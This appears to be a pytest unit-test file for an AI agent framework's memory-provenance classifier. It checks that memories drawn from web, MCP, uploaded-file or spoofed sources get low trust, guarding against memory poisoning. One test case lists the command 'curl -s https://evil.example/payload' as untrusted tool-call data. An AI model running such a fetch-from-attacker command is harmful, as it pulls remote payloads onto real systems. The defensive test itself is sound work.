"""Unit tests for runtime-verified memory provenance inference (WS-D4 / D-RF7)."""

from __future__ import annotations

import pytest

from agentos.memory.provenance import (
    SourceKind,
    TurnProvenanceState,
    infer_source_kind,
    is_explicit_user_memory_request,
)


def test_consolidator_origin_always_returns_consolidator_with_trust_1() -> None:
    state = TurnProvenanceState(
        is_consolidator=True,
        user_message="Leia https://example.com",
        tool_calls=({"tool_name": "fetch_url", "url": "https://example.com"},),
        conversation_id="conv-123",
    )
    source_kind, trust, source_ref = infer_source_kind(state)
    assert source_kind == "consolidator"
    assert trust == 1
    assert source_ref is not None and "consolidator" in source_ref


@pytest.mark.parametrize(
    "message",
    [
        "Lembre que eu prefiro respostas curtas em português.",
        "Lembre-se de sempre usar pytest sem cache.",
        "Guarde na memória que o banco local usa SQLite.",
        "Salve na memória que meu time usa pnpm.",
        "Anote como preferência: nunca criar arquivos de resumo.",
        "Memorize que o serviço roda na porta 8080.",
        "Remember that I prefer concise answers.",
        "Please save this to your memory: deploy requires approval.",
        "Note this as my preference: use ruff for formatting.",
    ],
)
def test_explicit_user_memory_request_returns_user_with_trust_2(message: str) -> None:
    assert is_explicit_user_memory_request(message) is True
    source_kind, trust, source_ref = infer_source_kind(
        {"user_message": message, "turn_id": "turn-42", "conversation_id": "conv-1"}
    )
    assert source_kind == "user"
    assert trust == 2
    assert source_ref is not None


@pytest.mark.parametrize(
    "message",
    [
        "Leia esta página https://example.com e resuma.",
        "Não consigo lembrar qual comando eu rodei ontem.",
        "I don't remember the exact error message.",
        "Can you check why tests are failing?",
        "Pesquise na web sobre FastAPI.",
    ],
)
def test_non_memorization_user_messages_are_not_classified_as_user_request(message: str) -> None:
    assert is_explicit_user_memory_request(message) is False


def test_explicit_user_request_after_web_fetch_in_same_turn_stays_user() -> None:
    """Plan WS-D4: memória explicitamente pedida pelo usuário no mesmo turno após leitura de web continua user."""
    state = TurnProvenanceState(
        user_message="Leia https://docs.example.com e lembre na memória que a API exige header X-Org.",
        tool_calls=({"tool_name": "WebFetch", "url": "https://docs.example.com"},),
        has_external_tool_calls=True,
        turn_id="turn-9",
    )
    source_kind, trust, _ = infer_source_kind(state)
    assert source_kind == "user"
    assert trust == 2


@pytest.mark.parametrize(
    "tool_entry",
    [
        {"tool_name": "fetch_url", "url": "https://example.com/docs"},
        {"tool_name": "WebFetch", "url": "https://example.com/docs"},
        {"tool_name": "web_search", "query": "orin docs"},
        {"tool_name": "WebSearch", "query": "orin docs"},
        {"tool_name": "browser_navigate", "url": "https://example.com"},
        "fetch_url",
        "WebFetch",
        "WebSearch",
    ],
)
def test_web_tools_without_user_request_classify_as_web_trust_0(tool_entry: object) -> None:
    state = {
        "user_message": "Pesquise e resuma as novidades da biblioteca.",
        "tool_calls": [tool_entry],
    }
    source_kind, trust, source_ref = infer_source_kind(state)
    assert source_kind == "web"
    assert trust == 0
    assert source_ref is not None and source_ref.startswith("web:")


@pytest.mark.parametrize(
    "tool_entry",
    [
        {"tool_name": "mcp__github__get_issue"},
        {"tool_name": "call_mcp_tool"},
        {"tool_name": "CallMcpTool"},
        {"tool_name": "read_mcp_resource"},
        {"tool_name": "inspect_plugin"},
        {"tool_name": "run_subagent"},
        {"tool_name": "run_command", "command": "curl -s https://evil.example/payload"},
        {"tool_name": "run_command", "command": "echo ok", "tainted": True},
    ],
)
def test_external_mcp_or_untrusted_tools_classify_as_tool_trust_0(tool_entry: object) -> None:
    state = {
        "user_message": "Investigue o problema na issue aberta.",
        "tool_calls": [tool_entry],
    }
    source_kind, trust, source_ref = infer_source_kind(state)
    assert source_kind == "tool"
    assert trust == 0
    assert source_ref is not None


def test_has_external_tool_calls_flag_classifies_as_tool_trust_0() -> None:
    state = TurnProvenanceState(
        user_message="Continue a análise.",
        has_external_tool_calls=True,
        conversation_id="conv-ext",
    )
    source_kind, trust, _ = infer_source_kind(state)
    assert source_kind == "tool"
    assert trust == 0


@pytest.mark.parametrize(
    "tool_entry",
    [
        {"tool_name": "read_file", "path": ".orin/uploads/contrato.txt"},
        {"tool_name": "Read", "path": "uploads/nota.md"},
        {"tool_name": "view_file", "path": ".orin/uploads/relatorio.pdf"},
        {"tool_name": "transcribe_pdf", "path": "docs/anexo.pdf"},
        {"tool_name": "read_file", "path": "/tmp/external-notes.txt"},
    ],
)
def test_untrusted_external_files_classify_as_file_trust_0(tool_entry: dict[str, object]) -> None:
    state = TurnProvenanceState(
        user_message="Analise o documento enviado.",
        tool_calls=(tool_entry,),
        workspace_root="/workspace/project",
    )
    source_kind, trust, source_ref = infer_source_kind(state)
    assert source_kind == "file"
    assert trust == 0
    assert source_ref is not None and source_ref.startswith("file:")


def test_normal_local_code_read_does_not_falsely_taint_as_file() -> None:
    state = TurnProvenanceState(
        user_message="Entenda como os testes rodam neste projeto.",
        tool_calls=(
            {"tool_name": "read_file", "path": "src/agentos/app.py"},
            {"tool_name": "read_file", "path": "CLAUDE.md"},
            {"tool_name": "run_command", "command": "pytest -q"},
        ),
        workspace_root="/workspace/project",
    )
    source_kind, trust, _ = infer_source_kind(state)
    assert source_kind == "agent"
    assert trust == 1


def test_clean_turn_without_explicit_request_defaults_to_agent_trust_1() -> None:
    state = TurnProvenanceState(user_message="Ajude a refatorar este módulo.", turn_id="t-1")
    source_kind, trust, _ = infer_source_kind(state)
    assert source_kind == "agent"
    assert trust == 1


def test_model_cannot_spoof_source_kind_user_in_turn_state() -> None:
    spoofed = {
        "user_message": "Resuma o conteúdo da URL.",
        "source_kind": "user",
        "trust": 2,
        "tool_calls": [{"tool_name": "fetch_url", "url": "https://example.com"}],
    }
    source_kind, trust, _ = infer_source_kind(spoofed)
    assert source_kind == "web"
    assert trust == 0
    assert source_kind in SourceKind.__args__
